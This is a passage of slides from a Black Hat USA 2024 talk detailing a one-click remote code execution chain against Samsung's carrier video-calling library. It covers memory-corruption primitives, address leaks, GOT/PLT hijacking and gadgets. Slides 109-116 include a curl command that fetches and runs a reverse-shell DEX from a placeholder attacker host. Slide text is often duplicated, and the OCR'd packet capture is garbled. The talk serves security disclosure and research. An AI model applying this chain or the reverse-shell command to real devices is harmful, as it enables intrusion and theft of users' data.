obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
obj2 obj2
+18120:
+18120:
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
CTransportManager obj2
obj2 CTransportManager obj2obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 61

### Write-primitive A is a ‘ Memory Elevator ’

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
obj2 obj2
+18120:
+18120:
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager  CTransportManager
CTransportManager obj2
obj2 CTransportManager obj2obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 62

##### How to leak this function pointer in CTransportManager object

###### **Idea**

- Moving the CallbackEvent function pointer from CTransportManager obj2/obj3 to the rtcp pkt buffer of CTransportManager obj1 using write-primitive A .

- Leaking the function pointer using the information leakage primitive .

**Two difficulties** ：

1. Would memory movement of write-primitive A cause program crashes?

2. Could the CallbackEvent function pointer be moved exactly to the rtcp pkt buffer?

#BHUSA @BlackHatEvents

## Slide 63

### The data after app_data_buf

CTransportManager object CTransportManager object
+2456: +2456:
App_data_buf App_data_buf
+3560:
List head List tail List headoverflowList tail
+3732:
pointer1 pointer1
rtp buf rtp buf
+6848: pointer2 pointer2
rtcp buf rtcp buf
+8456: pointer3 pointer3

**List head** ： RetransmissionRequest_object_list_head

**List tail:**

**Can be accurately** RetransmissionRequest_object_list_tail **covered**

**Pointer1:** Point to RTP buffer **Pointer2:** Point to RTCP buffer **Pointer3** :    Point to CTransportManager object - 8

#BHUSA @BlackHatEvents

## Slide 64

### Fixing overwritten pointers

###### **RetransmissionThread**

if (list head != List tail) {

###### **ReorderThread**

for (node : list) /* Iterate each node in the list*/ { MakeReTxPacketAndSend(…) SendRTCPPacket(…)

if (flag) /* If the rtp pkt lost*/ {

/*Insert node into RetransmissionRequest_object_list */ AddRetransmissionRequest(…) }

}

}
+0:next +0:next list_head
+8:pre +8:pre list_tail
… …
+28:seq+1 +28:seq

###### **We must fix these two pointers.**

#BHUSA @BlackHatEvents

## Slide 65

### Fixing overwritten pointers

###### **Pointer1/Pointer2:**

###### CTransportManager object

- Being destroyed has no negative impact.

###### **Pointer3 ((QWORD)this+1057)**

+2456:
App_data_buf
+3560:
List head List tail
+3732:
pointer1
rtp buf
+6848: pointer2

rtcp buf

- If Pointer 3 is set to zero, it will not be called.

- The data covering pointer3 comes from CTransportManager object 2.

- Most of the fields in CTransportManager object 2 are 0.

- Pointer 3 will be overwritten to 0.

……

pointer3

**The first difficulty has been solved. The memory movement of write-primitive A does not cause the program crash.**

#BHUSA @BlackHatEvents

## Slide 66

### Moving callback pointer to rtcp buffer

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CallbackEvent func2
CTransportManager  CTransportManager
obj2 obj2
+18120:
+18120:
CallbackEvent func3
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager CTransportManager  CTransportManager CTransportManager
obj2ob j 2 obj2obj2
CallbackEvent func3
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 67

### Moving callback pointer to rtcp buffer

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
CallbackEvent func2
+9072: +9072:
CallbackEvent func2
CTransportManager  CTransportManager
obj2 obj2
CallbackEvent func3
+18120:
+18120:
CallbackEvent func3
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CTransportManager CTransportManager  CTransportManager CTransportManager
obj2ob j 2 obj2obj2
CallbackEvent func3
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 68

### Moving callback pointer to rtcp buffer

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
CallbackEvent func2
+9072: +9072:
CallbackEvent func2
CTransportManager  CTransportManager
obj2 obj2
CallbackEvent func3
+18120:
+18120:
CallbackEvent func3
CTransportManager  CTransportManager
obj3 obj3

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CallbackEvent func1
CTransportManager  CTransportManager
obj1 obj1
+9072: +9072:
CallbackEvent func3
CTransportManager CTransportManager  CTransportManager CTransportManager
obj2ob j 2 obj2obj2
CallbackEvent func3
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

Second transportation

First transportation

#BHUSA @BlackHatEvents

## Slide 69

### Moving callback pointer to rtcp buffer

CControlManager object CControlManager object
+24: +24:
CallbackEvent func1 CTransportManager obj1 CallbackEvent func1CTransportManager obj1
CTransportManager
CTransportManager
obj1
obj1
+9072: +9072:
CallbackEvent func3
CTransportManager
CTransportManager
obj2
obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

CTransportManager obj1 as obj1

obj1 rtcp pkt buffer range: [obj1+6892 : obj1+8452] obj1 app_data buffer range: [obj1+2456 : obj1+3480] move step: (obj+6892) – (obj+2456) = 4436

|**id**|**Address**|**Number of**
**moves**|**Address after**
**moving**|**result**|
|---|---|---|---|---|
|**CallbackEvent**
**func1**|**obj1+2136**|**0**|**——**|**——**|
|**CallbackEvent**
**func2**|**obj1+11184**|**1**|**obj+6748**|**out**|
|**CallbackEvent**
**func3**|**obj1+20232**|**3**|**obj+6924**|**In**|
|**CallbackEvent**
**func4**|**obj1+29280**|**5**|**obj+7100**|**In**|
|**CallbackEvent**
**func5**|**obj1+38328**|**7**|**obj+7276**|**In**|

**We get the address of libsamsung.videoengine_9_0.so !**

Third transportation

#BHUSA @BlackHatEvents

## Slide 70

### Moving callback pointer to rtcp buffer

###### CControlManager object

###### CControlManager object

+24: +24:
CallbackEvent func1 CTransportManager obj1 CallbackEvent func1CTransportManager obj1
CTransportManager
CTransportManager
obj1 CallbackEvent func3obj 1
+9072: +9072:
CallbackEvent func3
CTransportManager
CTransportManager
obj2
obj2
+18120: +18120:
CTransportManager  CTransportManager
obj3 obj3

CTransportManager obj1 as obj1

obj1 rtcp pkt buffer range: [obj1+6892 : obj1+8452] obj1 app_data buffer range: [obj1+2456 : obj1+3480] move step: (obj+6892) – (obj+2456) = 4436

|**id**|**Address**|**Number of**
**moves**|**Address after**
**moving**|**result**|
|---|---|---|---|---|
|**CallbackEvent**
**func1**|**obj1+2136**|**0**|**——**|**——**|
|**CallbackEvent**
**func2**|**obj1+11184**|**1**|**obj+6748**|**out**|
|**CallbackEvent**
**func3**|**obj1+20232**|**3**|**obj+6924**|**In**|
|**CallbackEvent**
**func4**|**obj1+29280**|**5**|**obj+7100**|**In**|
|**CallbackEvent**
**func5**|**obj1+38328**|**7**|**obj+7276**|**In**|

**We get the address of libsamsung.videoengine_9_0.so !**

Third transportation

#BHUSA @BlackHatEvents

## Slide 71

Getting the address of libsamsung.videoengine_9_0.so with information
leakage primitive
Triggering the oobr vulnerability in  DMC_RTP_Sys_Parse_Rtcp_TMMBR_Packet
CTransportManager object
Attacker
+6892:
Attacker
tmmbn rtcp packet buffer
Eventcallback
Eventcallback
1560
rtcp pkt
DMC_RTP_Sys_Send_Rtcp_TMMBR_Packet bytes DMC_RTP_Sys_Parse_Rtcp_TMMBN_Packet
Rtcp_Packet send_buffer 4 bytes
buffer
Rtcp_Packet recv_buffer
1560 bytes padding…
Sendto libsamsung.videoengine_9
Sendto _0.so!Eventcallback
Eventcallback pointer
was moved to rtcp
The end of packet
buffer and then copied
to tmmbn packet body
DMC_RTP_Sys_Make_Rtcp_TMMBN_Packet
Victim

**We get the address of libsamsung.videoengine_9_0.so !**

#BHUSA @BlackHatEvents

## Slide 72

# Finding arbitrary library address

1. Obtaining the heap memory address where the vulnerability structure is located. 2. Obtaining the memory address of the library where the vulnerability is located. **3. Obtaining the memory address of any library.**

4. Calling libc!system.

(Done) (Done) **(to do)** (to do)

#BHUSA @BlackHatEvents

## Slide 73

### Finding arbitrary library : We Want More

- Just knowing the memory address of libsamsund_videoengine_9_0.so is not enough.(The address of libc.so is unknown for us)

- We decide to find a way to remotely leak arbitrary memory information.

sendto(fd,0x41414141,0x100,…) If we could call sendto and control the buffer address, we could leak any address memory information

#BHUSA @BlackHatEvents

## Slide 74

### RTP_SendRtpPacket is a good choice

**Goal:** To achieve remote information leakage at any address, we need to find a function capable of sending packets.

- **Parameter 1** is a structure that contains data such as fd, buffer, and socketaddr.

- • **Parameter 2** is the length of the packet to be sent.

#BHUSA @BlackHatEvents

## Slide 75

### How to call RTP_SendRtpPacket

plt

the calling location of RTP_SendRtpPacket

plt.got

- The function **RTP_SendRtpPacket** exists in librtp.so and is called by **libsamsund_videoengine_9_0.so.**

- • We have 3 methods to call RTP_SendRtpPacket in libsamsung_videoengine_9_0.so.

   - Plt

   - The calling location of RTP_SendRtpPacket

   - Got

#BHUSA @BlackHatEvents

## Slide 76

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 77

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 78

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 79

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
3
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow
#BHUSA @BlackHatEvents

## Slide 80

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
to plt? 3
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow
#BHUSA @BlackHatEvents

## Slide 81

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
to plt? 3
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
to the function called location？ overflow

#BHUSA @BlackHatEvents

## Slide 82

### How to call RTP_SendRtpPacket

CTransportManager object1
+6892:
**((_QWORD **)this + 1057) 2
**((_QWORD **)this + 1057)+16
1
to plt? 3
rtcp pkt buffer
Fuxx Cute CFI ！
+8456: *((_QWORD **)this + 1057)
to the function called location？ overflow

#BHUSA @BlackHatEvents

## Slide 83

### Challenge ---- CFI

- Samsung Galaxy s22 /s23 /note10+ have CFI enabled.

- • Samsung Galaxy A51 does not have CFI enabled.

   - Activate CFI

   - ……

CFI not enabled
……
……

#BHUSA @BlackHatEvents

## Slide 84

### Jumping the plt.got to control PC

**((_QWORD **)this + 1057)+16

CTransportManager object1
+6892:

**((_QWORD **)this + 1057)

rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 85

### Jumping the plt.got to control PC

**((_QWORD **)this + 1057)+16

CTransportManager object1
+6892:

**((_QWORD **)this + 1057)

1

rtcp pkt buffer

+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 86

### Jumping the plt.got to control PC

2
**((_QWORD **)this + 1057)+16

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)

1

rtcp pkt buffer
+8456: *((_QWORD **)this + 1057)
overflow

#BHUSA @BlackHatEvents

## Slide 87

### Jumping the plt.got to control PC

2

**((_QWORD **)this + 1057)+16 3

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)

1

rtcp pkt buffer

+8456: *((_QWORD **)this + 1057) overflow

#BHUSA @BlackHatEvents

## Slide 88

### Jumping the plt.got to control PC

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
rtcp pkt buffer

2
**((_QWORD **)this + 1057)+16 3
1
got

+8456: *((_QWORD **)this + 1057) overflow

#BHUSA @BlackHatEvents

## Slide 89

### Jumping the plt.got to control PC

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16 3
1
4
rtcp pkt buffer
got
+8456: *((_QWORD **)this + 1057)
overflow
#BHUSA @BlackHatEvents

#BHUSA @BlackHatEvents

## Slide 90

### RTP_SendRtpPacket parameter1 deployment

CTransportManager object

+3672:
V9:
a1: **((_QWORD **)this + 1057)
a1+176: V9
rtcp pkt buffer
V9+128: buffer
V9+160: fd
V9+168:
addr
addr struct
V9+136: length = a2

- Pointer _**((_QWORD **) this+1057)+16_ points to the got table address of _RTP_SendRtpPacket_ function.

- Pointer _* ((_QWORD *) this+1057)_ points to the controllable rtcp pkt buffer.

#BHUSA @BlackHatEvents

## Slide 91

### New challenge ---- parameter2 is zero

- **Bad news: parameter2, as a length parameter, is zero!**

- **We need to find a way to make parameter 2 non-zero.**

#BHUSA @BlackHatEvents

## Slide 92

### A good gadget : write 1 at any address

Write-primitive B assembly code

Write-primitive B pseudo code

###### **This gadget:**

- W2 is 1

- Set the [x8,#8] == ((unsigned int *)this + 2)

- Write x2(1) to (unsigned int *)this + 2)

Once ((unsigned int *)this + 2) is set to 1, it remains at 1.

###### Gadget of libsamsung.videoengine_9_0.so

#BHUSA @BlackHatEvents

## Slide 93

### First step:Jumping to gadget and setting parameter2 to 1

X8
X8+8
Control the pc to this gadget
*((unsigned int *)this + 2)

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0x60
Control pc to gadget
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 94

### First step:Jumping to gadget and setting parameter2 to 1

X8
X8+8

Control the pc to this gadget
*((unsigned int *)this + 2)

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0x60
1
Control pc to gadget
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 95

### First step:Jumping to gadget and setting parameter2 to 1

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
X8
X8+8
**((_QWORD **)this + 1057)+0x60
1
Control pc to gadget
rtcp pkt buffer
Control the pc to this gadget
+8456: *((_QWORD **)this + 1057) ove rflow
*((unsigned int *)this + 2)

#BHUSA @BlackHatEvents

## Slide 96

### First step:Jumping to gadget and setting parameter2 to 1

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
4 **((_QWORD **)this + 1057)+16
X8
X8+8
**((_QWORD **)this + 1057)+0x60
1
3
Control pc to gadget
rtcp pkt buffer
Control the pc to this gadget
+8456: *((_QWORD **)this + 1057) ove rflow
*((unsigned int *)this + 2)

#BHUSA @BlackHatEvents

## Slide 97

### First step:Jumping to gadget and setting parameter2 to 1

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
4 **((_QWORD **)this + 1057)+16
X8
X8+8
**((_QWORD **)this + 1057)+0x60
1
3
Control pc to gadget
rtcp pkt buffer
5
Control the pc to this gadget
+8456: *((_QWORD **)this + 1057) ove rflow
*((unsigned int *)this + 2)
#BHUSA @BlackHatEvents

## Slide 98

### First step:Jumping to gadget and setting parameter2 to 1

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
4 **((_QWORD **)this + 1057)+16
X8
X8+8
**((_QWORD **)this + 1057)+0x60
1
3
Control pc to gadget
rtcp pkt buffer
5
Control the pc to this gadget
+8456: *((_QWORD **)this + 1057) ove rflow
*((unsigned int *)this + 2)
6
#BHUSA @BlackHatEvents

#BHUSA @BlackHatEvents

## Slide 99

###### Sencode step: Calling RTP_SendRtpPacket and receiving leaked data

###### Sender(Victim)

###### Receiver(Hacker)

**sendto**

- **fd** : it can be enumerated from 0 to 0xff

- **buf** : point to an address which we want to leak

- **sockaddr** : set Ipv6 and UDP port

#BHUSA @BlackHatEvents

## Slide 100

### Leaking the address of libc!memcpy

- The function “ _memcpy”_ exists in the .plt.got of libsamsung_videoengine_9_0.so.

• We set ‘buf’ point to the position of “ _memcpy”_ in the .plt.got.

Remote leak of memcpy function memory address.GIF

#BHUSA @BlackHatEvents

## Slide 101

### Leaking the address of libc.so and more

**We can get all of the address by this method !**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024
Leaking the address of libc.so and more
( Aidp. por tesene
mar | Tine Sour Des ti Preto: Li
® Tine Sour: z Tis a
re ee 134... 25.193065 per aeaaar 134,. 25.193065 240) 134. 25.193065 2408 + #181
A6.. 27.208123 146, 27. 208123 27.208123 146. 27,208123 2401 146... 27.208123 2408 a6 > 8181
157... 29.217181 157..29.217181 2401 157. 217181 2408
29,217181 29.217181 Soci
31.222700 168.. 31.222700 31.222700 168.. 31.222700 2401 168..31.222708 2408, F269 + 8181 Len-1
178. 33.228373 178.. 33. 228371 SRT 178. 33.228371 240 178, 33.228371 2408 fase + 8181 Len-1
aa an ioaras aa ial 189,. 35.227931 oer 189,, 35.227931 240 189,, 35.227931 2408 a69 + 8181
24 37.226049 37.226049 200. 37.226049 240, 200... 37.226049 2408 369 » 8181
2808 39.226572 241|| 544 30.926572 24g|| 244~ 39-226572  240;|| 212. 39.226572 2408 aco » 8181
4 2408 41,261055 241! 453. 43 261055 240| | 223~41-261055 24a! | 223... 1, 2620 2408 F469 + 8181
233, 43.230294 2408, 43.230294 241) | 934. 43,2302 zag) | 233~45-230294 240 233.43.230294 2408. ao9 > #181
245 3743 (208. 45-333743 (2A 245..45,333743 249| | 245~ 45.333743 240) 245. 45,33374 a6
4369 2408 47,334809 28 249) | 256. 47. 33486 2401 256, 3486 Fa6o
267 42602 2408 49,342602 24! 342602 24a|| 267 49.342602  2401|| 267 342602 2408 fa + 8181
278..51.358285 2408: 51,398285 241! 374 6 y5az9s pag] | 278 51-398285 —-24@)|| 278.52, 358285 2408 f + #181 Len=1[Malformed Packet
289.. 53373212 2408 53.373212 241 nq 53,373912 pag] | 289" 53-373212 —-2401|| 289. 93.379212 2408 16 + 8181
300,.55.397460 2408 55.397460 241 397460 240|| 302. 240 300,,55.397460 2408 ae > 8181
82309 2408 241 310,. 57.382309 240 310, 240) 310,, 57.382309 2408 fa69 + 8181 Len-1
19523 2408 2a]! aa sind n 240 311., 57.399523 2408 £469 + 8181 Len=1
12259. 475196 2408 4il\ll) cos sea | || #42 240 922 59.375196 2408 ae + BIH Lenel
332. 61. 384489 2408 2aV 332 aae 32. 240 332., 61. 384489 2408 cas a6 » 8181 Len=1
83665 2408: | 244 343 240 343 240 | 343., 63. 2408 dcas f » 8181 Len=1
Frame 168331 69 bytes of” Frame 17881: 69 bytes), bree 19996: 69 bytes |> Frame 20076: 69 bytes |> Frame 21104: 69 bytes on wire (552 ), 69 bytes captured (552 bits)
Linux cooked capture v2/> Linux cooked capture |. iinux cooked capture \ > LINUX Cooked capture v|> Linux cooked capture v2
1 Versi > Internet Protocol ver: Internet Protocol ver Internet Pro
‘ocol Version 6, Src: 2408 das, Dst
fa69
Internet Protoc Internet Protocol ver!
User Datagram Protocol,|> User Datagram Protoce] , Yser patagram Protoco] > User Datagram Protocol |» User Datagram Protocol, Sr¢ Port: 1602, Dst Port: 8181
Datu (1 byte) bata (1 byte) (REMAN * 4t# (2 byte) Data (1 byte)
00 08 oe aK 86 dd 00 86 dd 00 00 00 G0 G0 1b 02 @7 G4 00 90 1b 22 3
86 dd 08 00 00 a0 o 86 dd 0@ 08 0@ ae
Zhes2 $
a ) IV-ES-@
1 o-i-B
a a8 09 66 af B2 e8 @9 66 af 71 fq
09 66 af Od 09 66 af Hd
off_E45F8 DCQ
71 00 00 00
We can get all of the address by this method
```

## Slide 102

# Final step: Getting remote shell

1. Obtaining the heap memory address where the vulnerability structure is located. 2. Obtaining the memory address of the library where the vulnerability is located. 3. Obtaining the memory address of any library. **4. Calling libc!system.**

(Done) (Done) (Done) **(to do)**

#BHUSA @BlackHatEvents

## Slide 103

### Calling libc.so!system directly

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 104

### Calling libc.so!system directly

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 105

### Calling libc.so!system directly

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 106

### Calling libc.so!system directly

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
3
rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 107

### Calling libc.so!system directly

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
3
to system? rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 108

### Calling libc.so!system directly

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
**((_QWORD **)this + 1057)+16
1
3
to system? rtcp pkt buffer
+8456: *((_QWORD **)this + 1057) ove rflow

**Parameter 1 cannot be precisely controlled !**

#BHUSA @BlackHatEvents

## Slide 109

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
**((_QWORD **)this + 1057)+0xe8
Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 110

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
**((_QWORD **)this + 1057)+0xe8
Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 111

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
**((_QWORD **)this + 1057)+0xe8
Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 112

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
**((_QWORD **)this + 1057)+0xe8 3
Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
4
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 113

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
5
**((_QWORD **)this + 1057)+0xe8 3
Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
4
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

#BHUSA @BlackHatEvents

## Slide 114

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
5
**((_QWORD **)this + 1057)+0xe8 3
command 6 Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
4
x8 rtcp pkt buffer
System function address
X8+0x120
+8456: *((_QWORD **)this + 1057) ove rflow

Gadget of libsamsung.videoengine_9_0.so

#BHUSA @BlackHatEvents

## Slide 115

### Another Gadget :Calling system and setting command

CTransportManager object1
+6892:
2
**((_QWORD **)this + 1057)
Gadget of libsamsung.videoengine_9_0.so  **((_QWORD **)this + 1057)+16
**((_QWORD **)this + 1057)+0xc0
1
5
**((_QWORD **)this + 1057)+0xe8 3
command 6 Curl –O hack.xxxx.org/reverse_shell.dex && app_process xxxxxxxx
4
x8 rtcp pkt buffer
System function address
X8+0x120
call +8456: *((_QWORD **)this + 1057) ove rflow
7

#BHUSA @BlackHatEvents

## Slide 116

### Getting shell

**system(“curl http://hack.xxxx.org/reverse_shell.dex > /sdcard/data/reverse_shell.dex && app_process -Djava.class.path=/sdcard/data/reverse_shell.dex /sdcard/data/ com.fantasyoung.shellexp.ReverseShell”)**

#BHUSA @BlackHatEvents

## Slide 117

###### One-click RCE exploitation ： attackers steal photos remotely

1. Obtaining the heap memory address where the vulnerability structure is located. (Done) 2. Obtaining the memory address of the library where the vulnerability is located. (Done) 3. Obtaining the memory address of any library. (Done) 4. Calling libc!system. (Done)

#BHUSA @BlackHatEvents

## Slide 118

###### One-click RCE exploitation ： attackers steal photos remotely

1. Obtaining the heap memory address where the vulnerability structure is located. (Done) 2. Obtaining the memory address of the library where the vulnerability is located. (Done) 3. Obtaining the memory address of any library. (Done) 4. Calling libc!system. (Done)

#BHUSA @BlackHatEvents

## Slide 119

#### Takeaways

⚫ **Introducing a remote attack surface about carrier based video calling** ⚫ **Validating the urgency to enhance the security of this attack surface** ⚫ **Showing an One-click RCE exploitation of this attack surface**

We will write a blog about this exploitation and post it later on twitter **(@Fantasyoung_)**

#BHUSA @BlackHatEvents

## Slide 120

#### Thanks

**Thank you to our friend – iceT(@iceT233) for helping us discover this attack surface !**

#BHUSA @BlackHatEvents

## Slide 121

#### Future Work

#### **Carrier Based video calling QUALCOMM, Samsung, MediaTek …**

**Haikuo Xie (@Thankkong)**

**Fan Yang (@Fantasyoung_)**

**<u>Looking for 2025 summer internship!</u>**

**Qinrun Dai (@2st___)**

#BHUSA @BlackHatEvents
